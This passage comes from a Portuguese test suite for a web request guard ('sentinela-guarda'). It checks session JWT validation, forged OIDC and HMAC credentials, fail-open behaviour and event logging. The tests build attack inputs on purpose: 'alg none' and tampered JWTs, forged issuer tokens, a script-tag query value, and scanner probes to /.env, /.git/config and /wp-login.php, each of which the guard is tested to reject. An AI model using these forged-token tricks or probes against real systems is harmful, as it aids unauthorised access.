  const r = await rodar(g, req('gestao-finaceiro.vercel.app', '/'), { fechado: FECHADO_FIN });
  assert.equal(r, null, 'com lista quem manda é o banco (chave de emergência no painel)');
  assert.equal(c.rota('/lista').length, 1, 'uma busca só (o segundo pedido reaproveita o voo)');
  conta(2);
});

caso('fechado + central muito lenta (4 s): desiste em ~2,5 s e usa a reserva (portal)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: false }));
  c.atrasoLista = 4000;
  const t0 = performance.now();
  const r = await g.sentinela(req('gestao-finaceiro.vercel.app', '/'), novoCtx(), { fechado: FECHADO_FIN });
  const ms = performance.now() - t0;
  assert.equal(r.status, 302, 'sem lista o fechado não abre');
  assert.ok(ms < 2900, 'resposta em menos de 2,9 s (foi ' + ms.toFixed(0) + ' ms)');
  conta(2);
});

caso('fechado + lista em cache com exige_login=true: igual ao exige_login normal', async () => {
  const g = await novoGuarda();
  const { H } = await cenarioLogin();
  const r = await rodar(g, req(H, '/'), { fechado: FECHADO_FIN });
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), PORTAL + '/?abrir=gestao-financeiro');
  conta(2);
});

caso('exige_login: rota pública "/" ou "/*" (casaria tudo) é ignorada; as outras continuam valendo', async () => {
  const g = await novoGuarda();
  const { H } = await cenarioLogin({ rotas: ['/', '/*', '/publico/'] });
  const r = await rodar(g, req(H, '/'));
  assert.equal(r && r.status, 302, '"/" não libera a página inicial');
  const a = await rodar(g, req(H, '/api/dados'));
  assert.equal(a && a.status, 401, '"/*" não libera a API');
  assert.equal(await rodar(g, req(H, '/publico/aviso.html')), null);
  conta(3);
});

caso('exige_login: rota pública "*", "" ou sem "/" no começo é ignorada (igual ao banco)', async () => {
  const g = await novoGuarda();
  const { H } = await cenarioLogin({ rotas: ['*', '', 'x*', ' /api/', '/publico/'] });
  const r = await rodar(g, req(H, '/'));
  assert.equal(r && r.status, 302, '"*" não libera a página inicial');
  const a = await rodar(g, req(H, '/api/dados'));
  assert.equal(a && a.status, 401, '" /api/" (com espaço) não libera a API');
  const x = await rodar(g, req(H, '/xpto'));
  assert.equal(x && x.status, 302);
  assert.equal(await rodar(g, req(H, '/publico/aviso.html')), null);
  conta(4);
});

caso('cookie de sessão válido → segue, identidade no evento (origem passe)', async () => {
  const g = await novoGuarda();
  const { chave, c, H } = await cenarioLogin();
  const tok = await assinarJwt(sessaoPayload(), chave);
  const cookie = 'outro=1; __Host-sentinela=' + tok + '; tema=escuro';
  assert.equal(await rodar(g, req(H, '/', { cookie })), null);
  assert.equal(await rodar(g, req(H, '/api/dados', { cookie })), null);
  const ev = c.eventos.at(-1);
  assert.equal(ev.identidade, 'julio@lube.com.br');
  assert.equal(ev.identidade_origem, 'passe');
  assert.equal(ev.decisao, 'liberado');
  // sem exige_login a identidade também vai no evento
  const g2 = await novoGuarda();
  const c2 = centralFalsa(lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', chaves: [chave.jwk] }));
  await rodar(g2, req(H, '/', { cookie }));
  assert.equal(c2.eventos[0].identidade, 'julio@lube.com.br');
  conta(6);
});

caso('sessão rejeitada: aud de outro projeto, vencida, outra chave, alg none, typ passe, iss errado, lixo', async () => {
  const g = await novoGuarda();
  const { chave, outra, c, H } = await cenarioLogin();
  const ruins = {
    'aud de outro projeto': await assinarJwt(sessaoPayload({ aud: 'painel-compras' }), chave),
    'vencida': await assinarJwt(sessaoPayload({ exp: Math.floor(Date.now() / 1000) - 5 }), chave),
    'assinada por outra chave': await assinarJwt(sessaoPayload(), { ...outra, kid: chave.kid }),
    'kid desconhecido': await assinarJwt(sessaoPayload(), outra),
    'typ passe': await assinarJwt(sessaoPayload({ typ: 'passe' }), chave),
    'iss errado': await assinarJwt(sessaoPayload({ iss: 'outro' }), chave),
    'alg none': (() => { const v = (x) => Buffer.from(JSON.stringify(x)).toString('base64url'); return v({ alg: 'none' }) + '.' + v(sessaoPayload()) + '.'; })(),
    'assinatura adulterada': (await assinarJwt(sessaoPayload(), chave)).slice(0, -4) + 'AAAA',
    'payload trocado': await (async () => { const t = await assinarJwt(sessaoPayload(), chave); const p = t.split('.'); p[1] = Buffer.from(JSON.stringify(sessaoPayload({ email: 'invasor@x.com' }))).toString('base64url'); return p.join('.'); })(),
    'lixo': 'abc.def',
  };
  for (const [nome, tok] of Object.entries(ruins)) {
    const r = await rodar(g, req(H, '/', { cookie: '__Host-sentinela=' + tok }));
    assert.ok(r && r.status === 302, nome + ': deveria mandar para o portal');
    assert.equal(c.eventos.at(-1).identidade, null, nome);
    conta(2);
    avancar(5100);   // fura o dedupe para cada evento sair
  }
});

caso('opcoes.identidade (Next) tem prioridade e satisfaz o exige_login', async () => {
  const g = await novoGuarda();
  const { c, H } = await cenarioLogin();
  assert.equal(await rodar(g, req(H, '/'), { identidade: { email: 'ana@lube.com.br', origem: 'sessao_app' } }), null);
  assert.equal(c.eventos.at(-1).identidade, 'ana@lube.com.br');
  assert.equal(c.eventos.at(-1).identidade_origem, 'sessao_app');
  conta(3);
});

/* =========================================================
   5. Passe vindo do portal
   ========================================================= */
caso('passe na query → POST /sessao → 302 com Set-Cookie __Host-sentinela e URL limpa', async () => {
  const g = await novoGuarda();
  const { chave, c, H } = await cenarioLogin();
  const sessao = await assinarJwt(sessaoPayload(), chave);
  c.sessaoOk = async (b) => (b.passe === 'eyJh.eyJw.c2ln' ? { ok: true, sessao, exp: new Date(Date.now() + 8 * 3600e3).toISOString(), email: 'julio@lube.com.br' } : null);
  const r = await rodar(g, req(H, '/folha.html?aba=resumo&sentinela_passe=eyJh.eyJw.c2ln&mes=09'));
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), 'https://' + H + '/folha.html?aba=resumo&mes=09');
  assert.equal(r.headers.get('set-cookie'), '__Host-sentinela=' + sessao + '; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=28800');
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.equal(c.sessoes.length, 1);
  assert.deepEqual(c.sessoes[0], { passe: 'eyJh.eyJw.c2ln' });
  const chamada = c.rota('/sessao')[0];
  assert.match(chamada.headers.get('authorization'), /^Bearer /);
  assert.equal(chamada.headers.get('content-type'), 'application/json');
  const ev = c.eventos.at(-1);
  assert.equal(ev.decisao, 'liberado');
  assert.equal(ev.motivo, 'entrada pelo Painel Lube');
  assert.equal(ev.identidade, 'julio@lube.com.br');
  assert.equal(ev.consulta, '?aba=resumo&mes=09', 'o passe não vai para o registro');
  // só o passe na query → sem "?"
  const r2 = await rodar(g, req(H, '/?sentinela_passe=eyJh.eyJw.c2ln'));
  assert.equal(r2.headers.get('location'), 'https://' + H + '/');
  // com o cookie, a próxima requisição entra
  assert.equal(await rodar(g, req(H, '/folha.html', { cookie: '__Host-sentinela=' + sessao })), null);
  conta(15);
});

caso('passe inválido → 302 sem cookie de sessão, evento observado passe_invalido; laço quebrado', async () => {
  const g = await novoGuarda();
  const { c, H } = await cenarioLogin();
  const r = await rodar(g, req(H, '/?sentinela_passe=eyJh.eyJw.velho'));
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), 'https://' + H + '/');
  const sc = r.headers.get('set-cookie') || '';
  assert.ok(!sc.includes('__Host-sentinela='), 'sem cookie de sessão');
  assert.ok(sc.startsWith('__Host-sentinela-falha=1;'));
  assert.equal(c.eventos.at(-1).decisao, 'observado');
  assert.equal(c.eventos.at(-1).regra, 'passe_invalido');
  // voltando sem sessão, mas com a marca de falha: portal sem ?abrir (não reabre em laço)
  const r2 = await rodar(g, req(H, '/', { cookie: '__Host-sentinela-falha=1' }));
  assert.equal(r2.status, 302);
  assert.equal(r2.headers.get('location'), PORTAL + '/');
  // passe malformado nem vai para a central
  const antes = c.sessoes.length;
  await rodar(g, req(H, '/?sentinela_passe=%3Cscript%3E', { ip: '8.8.4.4' }));
  assert.equal(c.sessoes.length, antes);
  conta(9);
});

caso('passe com central lenta: desiste em ~2,5 s e segue o fluxo de falha', async () => {
  const g = await novoGuarda();
  const { c, H } = await cenarioLogin();
  await rodar(g, req(H, '/publico/'));        // lista em cache
  c.atrasoSessao = 6000;
  const t0 = performance.now();
  const r = await rodar(g, req(H, '/?sentinela_passe=eyJh.eyJw.c2ln'));
  const dt = performance.now() - t0;
  assert.equal(r.status, 302);
  assert.ok(dt >= 2400 && dt < 3000, 'tempo ' + dt.toFixed(0) + ' ms');
  assert.equal(c.eventos.at(-1).regra, 'passe_invalido');
  conta(3);
});

/* =========================================================
   6. Central fora do ar, lenta, exceções
   ========================================================= */
caso('central fora do ar → segue sem erro, rápido; ataques ainda barrados', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  c.fora = true;
  const t0 = performance.now();
  assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/api/dados')), null);
  const dt = performance.now() - t0;
  assert.ok(dt < 100, 'tempo ' + dt.toFixed(1) + ' ms');
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/.env', { ip: '3.3.3.3' })), 'outro');
  // e não martela a central enquanto ela está fora
  const listas = c.rota('/lista').length;
  for (let i = 0; i < 20; i++) await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ip: '3.3.4.' + i }));
  assert.equal(c.rota('/lista').length, listas, 'pausa de 15 s após falha');
  conta(3);
});

caso('central lenta (timeout) → 1ª requisição segue em ≤ 750 ms; as seguintes não esperam', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger' }));
  c.atraso = 5000;
  const t0 = performance.now();
  const ctx = novoCtx();
  const r = await g.sentinela(req('painel-compras-rosy.vercel.app', '/api/dados'), ctx);
  const dt = performance.now() - t0;
  assert.equal(r, null);
  assert.ok(dt >= 650 && dt <= 750, '1ª requisição: ' + dt.toFixed(0) + ' ms');
  const t1 = performance.now();
  assert.equal(await g.sentinela(req('painel-compras-rosy.vercel.app', '/'), novoCtx()), null);
  bloqueio403(await g.sentinela(req('painel-compras-rosy.vercel.app', '/wp-login.php', { ip: '4.4.4.4' }), novoCtx()), 'outro');
  const dt2 = performance.now() - t1;
  assert.ok(dt2 < 50, 'seguintes: ' + dt2.toFixed(1) + ' ms');
  // a lista pendente foi para o waitUntil e é abortada em 2,5 s; o POST /evento (saiu aos ~700 ms)
  // também tem 2,5 s → tudo termina em ~3,2 s, nunca nos 5 s da central lenta
  await ctx.esperar();
  const total = performance.now() - t0;
  assert.ok(total >= 3000 && total < 3600, 'waitUntil termina em ~3,2 s: ' + total.toFixed(0));
  assert.equal(c.rota('/lista').length, 1, 'não insiste na central durante a pausa');
  conta(5);
});

caso('central lenta para a 1ª lista mas responde em 1,2 s → as próximas usam a lista', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger' }));
  c.atrasoLista = 1200;
  const ctx = novoCtx();
  assert.equal(await g.sentinela(req('painel-compras-rosy.vercel.app', '/', { ua: 'curl/8' }), ctx), null, 'sem lista: robô só observado');
  await ctx.esperar();
  c.atrasoLista = 0;
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ua: 'curl/8', ip: '9.9.9.9' })), 'outro');
});

caso('lista velha (> 20 s) → usa e renova em segundo plano (stale-while-revalidate)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'observar' }));
  const H = 'painel-compras-rosy.vercel.app';
  assert.equal(await rodar(g, req(H, '/')), null);
  assert.equal(c.rota('/lista').length, 1);
  avancar(10000);
  await rodar(g, req(H, '/a'));
  assert.equal(c.rota('/lista').length, 1, 'fresca: não busca');
  avancar(11000);
  c.lista = lista({ modo: 'proteger' });
  c.atrasoLista = 400;
  const ctx = novoCtx();
  const t0 = performance.now();
  assert.equal(await g.sentinela(req(H, '/b', { ua: 'curl/8' }), ctx), null, 'usa a velha (observar) sem esperar');
  assert.ok(performance.now() - t0 < 50);
  assert.equal(ctx.pendentes > 0, true, 'renovação foi para o waitUntil');
  await ctx.esperar();
  assert.equal(c.rota('/lista').length, 2);
  bloqueio403(await rodar(g, req(H, '/c', { ua: 'curl/8', ip: '9.9.9.8' })), 'outro');
  conta(6);
});

caso('exceção interna forçada → null (falha aberta)', async () => {
  const g = await novoGuarda();
  centralFalsa(lista());
  const quebrado = { get url() { throw new Error('url quebrada'); }, headers: new Headers(), method: 'GET' };
  assert.equal(await g.sentinela(quebrado), null);
  const cabQuebrado = { url: 'https://x.vercel.app/', method: 'GET', headers: { get() { throw new Error('headers quebrados'); } } };
  assert.equal(await g.sentinela(cabQuebrado), null);
  assert.equal(await g.sentinela(null), null);
  // fetch que explode de forma síncrona e waitUntil que explode
  globalThis.fetch = () => { throw new Error('fetch síncrono'); };
  const ctxRuim = { waitUntil() { throw new Error('waitUntil quebrado'); } };
  assert.equal(await g.sentinela(req('painel-compras-rosy.vercel.app', '/'), ctxRuim), null);
  bloqueio403(await g.sentinela(req('painel-compras-rosy.vercel.app', '/.git/config', { ip: '6.6.6.6' }), ctxRuim), 'outro');
  // lista malformada da central
  const g2 = await novoGuarda();
  const c2 = centralFalsa({ v: 1, bloqueios: 'x', confiaveis: [{ t: 'ip', v: 'não-é-ip' }, null], sistema: { projeto: 1 }, chaves: [{ kty: 'RSA' }] });
  assert.equal(await rodar(g2, req('painel-compras-rosy.vercel.app', '/', { cookie: '__Host-sentinela=a.b.c' })), null);
  assert.equal(c2.eventos.length, 1);
  conta(7);
});

caso('sem waitUntil: dispara e esquece (não espera a central)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  await g.sentinela(req('painel-compras-rosy.vercel.app', '/'));
  c.atraso = 3000;
  const t0 = performance.now();
  assert.equal(await g.sentinela(req('painel-compras-rosy.vercel.app', '/x')), null);
  assert.ok(performance.now() - t0 < 50);
  conta(2);
});

/* =========================================================
   7. Dedupe, saúde, credenciais
   ========================================================= */
caso('dedupe: mesma (ip, caminho, decisão) em 5 s não é reenviada; mapa limitado a 500', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  for (let i = 0; i < 5; i++) await rodar(g, req(H, '/api/dados'));
  assert.equal(c.eventos.length, 1);
  await rodar(g, req(H, '/api/dados', { ua: 'curl/8' }));       // outra decisão (observado)
  await rodar(g, req(H, '/api/dados', { ip: '200.1.1.1' }));    // outro IP
  await rodar(g, req(H, '/api/outro'));                         // outro caminho
  assert.equal(c.eventos.length, 4);
  avancar(4900);
  await rodar(g, req(H, '/api/dados'));
  assert.equal(c.eventos.length, 4, 'ainda dentro dos 5 s');
  avancar(200);
  await rodar(g, req(H, '/api/dados'));
  assert.equal(c.eventos.length, 5, 'passou dos 5 s: reenvia');
  // 600 chaves novas empurram as antigas para fora (um IP por caminho: o teto por IP é outro teste)
  const ipDe = (i) => '10.9.' + Math.floor(i / 250) + '.' + (i % 250);
  for (let i = 0; i < 600; i++) await rodar(g, req(H, '/p' + i, { ip: ipDe(i) }));
  const n = c.eventos.length;
  assert.equal(n, 605);
  await rodar(g, req(H, '/p0', { ip: ipDe(0) }));
  assert.equal(c.eventos.length, n + 1, '/p0 saiu do mapa (limite 500) e foi reenviado');
  await rodar(g, req(H, '/p599', { ip: ipDe(599) }));
  assert.equal(c.eventos.length, n + 1, '/p599 ainda está no mapa');
  conta(7);
});

caso('GET /.sentinela/saude → JSON no-store, sem expor listas, sem evento', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', bloqueios: [{ id: 1, t: 'ip', v: '185.220.101.4', n: 'certo', ate: null }], confiaveis: [{ t: 'ip', v: '177.100.20.30' }] }));
  const r = await rodar(g, req('painel-compras-rosy.vercel.app', '/.sentinela/saude'));
  assert.equal(r.status, 200);
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.match(r.headers.get('content-type'), /application\/json/);
  const txt = await r.text();
  const j = JSON.parse(txt);
  assert.deepEqual(Object.keys(j), ['guarda', 'runtime', 'oidc', 'lista', 'ip', 'pais', 'cidade']);
  assert.deepEqual(Object.keys(j.lista), ['ok', 'idade_s', 'modo']);
  assert.equal(j.guarda, 'sentinela-guarda/1.1.0');
  assert.equal(j.runtime, 'nodejs');
  assert.equal(j.oidc, true);
  assert.equal(j.lista.ok, true);
  assert.equal(j.lista.modo, 'proteger');
  assert.equal(typeof j.lista.idade_s, 'number');
  assert.equal(j.ip, '177.100.20.30');
  assert.equal(j.pais, 'BR');
  assert.equal(j.cidade, 'Cariacica');
  assert.ok(!txt.includes('185.220.101.4'));
  assert.equal(c.eventos.length, 0);
  // sem credencial: oidc false, lista.ok false, e nenhuma chamada à central
  const g2 = await novoGuarda();
  const c2 = centralFalsa(lista());
  const j2 = await (await rodar(g2, req('x.vercel.app', '/.sentinela/saude', { oidc: false }))).json();
  assert.equal(j2.oidc, false);
  assert.deepEqual(j2.lista, { ok: false, idade_s: null, modo: null });
  assert.equal(c2.chamadas.length, 0);
  conta(19);
});

caso('sem token OIDC e sem SENTINELA_CHAVE → não registra, regras locais valem', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/', { oidc: false })), null);
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/.env', { oidc: false })), 'outro');
  assert.equal(c.chamadas.length, 0);
  // token de outro time / outro emissor / vencido é ignorado
  for (const ruim of [oidcFalso({ owner_id: 'team_outro' }), oidcFalso({ iss: 'https://evil' }), oidcFalso({ exp: 10 }), 'lixo']) {
    await rodar(g, req('painel-compras-rosy.vercel.app', '/z', { oidc: ruim }));
  }
  assert.equal(c.chamadas.length, 0);
  conta(3);
});

caso('OIDC do ambiente (VERCEL_OIDC_TOKEN) quando o header não vem; header forjado não cala o registro', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const tokEnv = oidcFalso({ project: 'via-env' });
  process.env.VERCEL_OIDC_TOKEN = tokEnv;
  try {
    await rodar(g, req('painel-compras-rosy.vercel.app', '/', { oidc: false }));
    await rodar(g, req('painel-compras-rosy.vercel.app', '/y', { oidc: 'eyJhbGciOiJub25lIn0.eyJpc3MiOiJldmlsIn0.x' }));
    assert.ok(c.chamadas.length >= 2);
    for (const ch of c.chamadas) assert.equal(ch.headers.get('authorization'), 'Bearer ' + tokEnv);
    assert.equal(c.eventos.length, 2);
  } finally {
    delete process.env.VERCEL_OIDC_TOKEN;
  }
  conta(3);
});

caso('plano B HMAC (SENTINELA_CHAVE + SENTINELA_PROJETO): assinatura t=,v1= confere', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const chave = 'chave-de-teste-gerada-no-teste-' + Math.random();
  process.env.SENTINELA_CHAVE = chave;
  process.env.SENTINELA_PROJETO = 'painel-compras';
  process.env.VERCEL_ENV = 'preview';
  try {
    assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/api/dados', { oidc: false })), null);
    assert.equal(c.rota('/lista').length, 1);
    assert.equal(c.eventos.length, 1);
    for (const ch of c.chamadas) {
      assert.equal(ch.headers.get('authorization'), null);
      const m = /^t=(\d+),v1=([0-9a-f]{64})$/.exec(ch.headers.get('x-sentinela-assinatura'));
      assert.ok(m);
      const corpoBruto = ch.init.method === 'POST' ? ch.init.body : '';
      assert.equal(m[2], hmacHex(chave, m[1] + '.' + corpoBruto));
      assert.ok(Math.abs(Date.now() / 1000 - Number(m[1])) < 5);
      assert.equal(ch.headers.get('x-sentinela-projeto'), 'painel-compras');
      assert.equal(ch.headers.get('x-sentinela-ambiente'), 'preview');
      conta(6);
    }
  } finally {
    delete process.env.SENTINELA_CHAVE; delete process.env.SENTINELA_PROJETO; delete process.env.VERCEL_ENV;
  }
});

caso('não lê o corpo e não altera a requisição', async () => {
  const g = await novoGuarda();
  centralFalsa(lista());
  const r = new Request('https://painel-compras-rosy.vercel.app/api/agente', {
    method: 'POST', body: JSON.stringify({ mensagens: ['oi'] }),
    headers: { 'x-real-ip': '177.1.1.1', 'user-agent': UA, 'x-vercel-oidc-token': oidcFalso(), 'content-type': 'application/json' },
  });
  const antes = [...r.headers.entries()].map((x) => x.join('=')).join('&');
  assert.equal(await rodar(g, r), null);
  assert.equal(r.bodyUsed, false);
  assert.equal([...r.headers.entries()].map((x) => x.join('=')).join('&'), antes);
  assert.deepEqual(await r.json(), { mensagens: ['oi'] });
  conta(4);
});

/* =========================================================
   8. Desempenho com lista em cache
   ========================================================= */
caso('desempenho: tempo médio por requisição com lista em cache', async () => {
  const chave = await gerarChave('a1b2c3d4e5f60718');
  const bloqueios = [];
  for (let i = 0; i < 5000; i++) bloqueios.push({ id: i, t: i % 50 === 0 ? 'cidr' : 'ip', v: i % 50 === 0 ? '10.' + (i % 250) + '.0.0/16' : '45.' + Math.floor(i / 250) + '.' + (i % 250) + '.9', n: 'certo', ate: null });
  const confiaveis = [{ t: 'cidr', v: '177.100.20.0/24' }, { t: 'ip', v: '200.200.200.200' }];
  const g = await novoGuarda();
  const c = centralFalsa(lista({ bloqueios, confiaveis, chaves: [chave.jwk], projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: true, rotas: ['/publico/'] }));
  const H = 'gestao-finaceiro.vercel.app';
  const cookie = '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), chave));
  const ctx = { waitUntil(p) { p.catch(() => {}); } };
  await rodar(g, req(H, '/publico/'));   // aquece a lista
  globalThis.fetch = async () => new Response('{}', { status: 200 });   // central instantânea
  const medir = async (nome, n, fazer) => {
    for (let i = 0; i < 200; i++) await fazer(i);   // aquecimento do JIT
    const t0 = performance.now();
    for (let i = 0; i < n; i++) await fazer(i);
    const us = ((performance.now() - t0) / n) * 1000;
    console.log('        ' + nome.padEnd(52) + (us / 1000).toFixed(3) + ' ms/req  (' + n + ' req)');
    return us;
  };
  const reqs = Array.from({ length: 64 }, (_, i) => i);
  const t1 = await medir('legítima com sessão (5000 bloqueios na lista)', 20000, (i) => g.sentinela(req(H, '/api/dados?p=' + (i % 64), { cookie, ip: '189.6.' + (i % 200) + '.' + reqs[i % 64] }), ctx));
  const t2 = await medir('legítima sem login, rota pública', 20000, (i) => g.sentinela(req(H, '/publico/x' + (i % 300), { ip: '189.7.' + (i % 200) + '.1' }), ctx));
  const t3 = await medir('ataque → 403 (SHA-256 do incidente)', 5000, (i) => g.sentinela(req(H, '/.env', { ip: '31.' + (i % 200) + '.' + Math.floor(i / 200) + '.7' }), ctx));
  const t4 = await medir('só construir o Request (referência)', 20000, (i) => Promise.resolve(req(H, '/api/dados?p=' + (i % 64), { cookie })));
  globalThis.__desempenho = { t1, t2, t3, t4 };
  assert.ok(t1 / 1000 < 1, 'média abaixo de 1 ms');
  assert.ok(c.chamadas.length >= 1);
  conta(2);
});

/* =========================================================
   9. Achados da revisão (2026-10-05)
   ========================================================= */
const HF = 'gestao-finaceiro.vercel.app';
const listaFin = (extra = {}) => lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: true, ...extra });
const tokFin = (extra = {}) => oidcFalso({ project: 'gestao-finaceiro', ...extra });
const naoBom = (c, bom) => c.chamadas.filter((x) => x.headers.get('authorization') && x.headers.get('authorization') !== 'Bearer ' + bom);

caso('OIDC forjado no header: o token do ambiente vai na frente; lista, exige_login e registro valem', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  const bom = tokFin({ jti: 'bom-1' });
  const forjado = tokFin({ jti: 'forjado-1' });   // emissor/time/exp plausíveis, assinatura falsa
  c.aceitos = [bom];
  process.env.VERCEL_OIDC_TOKEN = bom;
  try {
    const r = await rodar(g, req(HF, '/api/dados', { oidc: forjado, ip: '45.10.0.1' }));
    assert.equal(r && r.status, 401, 'instância fria com header forjado: a folha continua exigindo login');
    bloqueio403(await rodar(g, req(HF, '/wp-login.php', { oidc: forjado, ip: '45.10.0.2' })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'varredura', 'o ataque com header forjado fica registrado');
    assert.equal(c.com(forjado).length, 0, 'o token forjado nem chega à central');
  } finally {
    delete process.env.VERCEL_OIDC_TOKEN;
  }
  conta(3);
});

caso('plano B: HMAC vai na frente do header forjado', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  c.aceitos = [];   // a central só aceita o HMAC
  const forjado = tokFin({ jti: 'forjado-2' });
  process.env.SENTINELA_CHAVE = 'chave-de-teste-gerada-no-teste-' + Math.random();
  process.env.SENTINELA_PROJETO = 'gestao-finaceiro';
  try {
    assert.equal((await rodar(g, req(HF, '/api/dados', { oidc: forjado, ip: '45.11.0.1' }))).status, 401);
    bloqueio403(await rodar(g, req(HF, '/.env', { oidc: forjado, ip: '45.11.0.2' })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'varredura');
    assert.equal(c.com(forjado).length, 0);
    for (const ch of c.chamadas) assert.match(ch.headers.get('x-sentinela-assinatura'), /^t=\d+,v1=[0-9a-f]{64}$/);
  } finally {
    delete process.env.SENTINELA_CHAVE; delete process.env.SENTINELA_PROJETO;
  }
  conta(4);
});

caso('só o header: token recusado fica de quarentena e não pausa a lista para quem tem token bom', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  const bom = tokFin({ jti: 'bom-3' });
  const forjado = tokFin({ jti: 'forjado-3' });
  c.aceitos = [bom];
  // instância fria cuja 1ª requisição só traz o forjado: sem credencial boa, falha aberta só para ela
  assert.equal(await rodar(g, req(HF, '/api/dados', { oidc: forjado, ip: '45.12.0.1' })), null);
  // logo em seguida, quem traz o token bom pega a lista na hora (sem os 15 s de pausa)
  assert.equal((await rodar(g, req(HF, '/api/dados', { oidc: bom, ip: '177.12.0.1' }))).status, 401);
  // o forjado não volta à central e a renovação usa o token já aceito
  const antes = c.com(forjado).length;
  avancar(21000);
  assert.equal((await rodar(g, req(HF, '/api/dados', { oidc: forjado, ip: '45.12.0.2' }))).status, 401);
  assert.equal(c.com(forjado).length, antes, 'forjado de quarentena');
  assert.ok(c.rota('/lista').filter((x) => x.headers.get('authorization') === 'Bearer ' + bom).length >= 2, 'renovou com o token aceito');
  conta(5);
});

caso('instância quente: header forjado a cada 16 s por 2 h não trava a renovação da lista', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  const bom = tokFin({ jti: 'bom-4', exp: Math.floor(Date.now() / 1000) + 4 * 3600 });
  c.aceitos = [bom];
  assert.equal((await rodar(g, req(HF, '/api/dados', { oidc: bom, ip: '177.13.0.1' }))).status, 401);
  for (let i = 0; i < 450; i++) {
    avancar(16000);
    const r = await rodar(g, req(HF, '/api/dados', { oidc: tokFin({ jti: 'f' + i }), ip: '45.13.' + Math.floor(i / 250) + '.' + (i % 250) }));
    assert.equal(r && r.status, 401);
  }
  // 2 h depois a lista segue fresca e a folha continua exigindo login, mesmo sem header nenhum
  const r = await rodar(g, req(HF, '/api/dados', { oidc: false, ip: '45.13.9.9' }));
  assert.equal(r && r.status, 401);
  const renovadas = c.rota('/lista').length;
  assert.ok(renovadas >= 200, 'renovações: ' + renovadas);
  assert.equal(naoBom(c, bom).length, 0, 'nenhuma chamada com token forjado');
  conta(453);
});

caso('requisições juntas: o voo de um token forjado não deixa a legítima sem lista', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(listaFin());
  const bom = tokFin({ jti: 'bom-5' });
  c.aceitos = [bom];
  c.atrasoLista = 100;
  const t0 = performance.now();
  const [ra, rb] = await Promise.all([
    rodar(g, req(HF, '/api/dados', { oidc: tokFin({ jti: 'forjado-5' }), ip: '45.14.0.1' })),
    rodar(g, req(HF, '/api/dados', { oidc: bom, ip: '177.14.0.1' })),
  ]);
  assert.equal(ra, null, 'a forjada (fria, sem credencial boa) segue em falha aberta');
  assert.equal(rb && rb.status, 401, 'a legítima tentou de novo com o próprio token');
  assert.ok(performance.now() - t0 < 700);
  conta(3);
});

caso('evento de quem só trouxe token forjado espera na fila e sai com a próxima requisição legítima', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const bom = oidcFalso({ jti: 'bom-fila' });
  c.aceitos = [bom];
  const H = 'painel-compras-rosy.vercel.app';
  bloqueio403(await rodar(g, req(H, '/.git/config', { oidc: oidcFalso({ jti: 'forjado-fila' }), ip: '45.25.0.1' })), 'outro');
  assert.equal(c.eventos.length, 0, 'a central recusou o forjado');
  await rodar(g, req(H, '/a', { oidc: bom, ip: '177.25.0.2' }));
  avancar(2100);
  await rodar(g, req(H, '/b', { oidc: bom, ip: '177.25.0.3' }));
  assert.ok(c.eventos.some((e) => e.regra === 'varredura' && e.ip === '45.25.0.1'), 'o ataque chegou à central');
  assert.equal(c.eventos.length, 3);
  conta(3);
});

caso('lote que a central recusa por credencial volta para a fila (não se perde)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const H = 'painel-compras-rosy.vercel.app';
  const curto = oidcFalso({ jti: 'curto', exp: Math.floor(Date.now() / 1000) + 30 });
  const bom2 = oidcFalso({ jti: 'bom2', exp: Math.floor(Date.now() / 1000) + 3600 });
  c.aceitos = [curto, bom2];
  await rodar(g, req(H, '/', { oidc: curto, ip: '177.26.0.1' }));   // lista + token aceito
  avancar(40000);                                                     // o aceito venceu; lista velha
  c.atrasoLista = 50;                                                 // a renovação (com o forjado) demora
  const forjado = oidcFalso({ jti: 'forjado-lote' });
  bloqueio403(await rodar(g, req(H, '/wp-login.php', { oidc: forjado, ip: '45.26.0.1' })), 'outro');
  assert.ok(c.com(forjado).some((x) => x.rota === '/evento'), 'tentou o /evento com o forjado');
  assert.equal(c.eventos.length, 1);
  avancar(2100);
  c.atrasoLista = 0;
  await rodar(g, req(H, '/x', { oidc: bom2, ip: '177.26.0.2' }));
